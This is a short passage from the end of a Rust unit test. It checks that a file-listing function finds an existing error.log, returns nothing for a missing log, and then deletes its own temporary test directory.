        assert_eq!(System.files(&format!("{d}/error.log")), vec![dir.join("error.log")]);
        assert!(System.files(&format!("{d}/missing.log")).is_empty());
        std::fs::remove_dir_all(&dir).unwrap();
    }
}
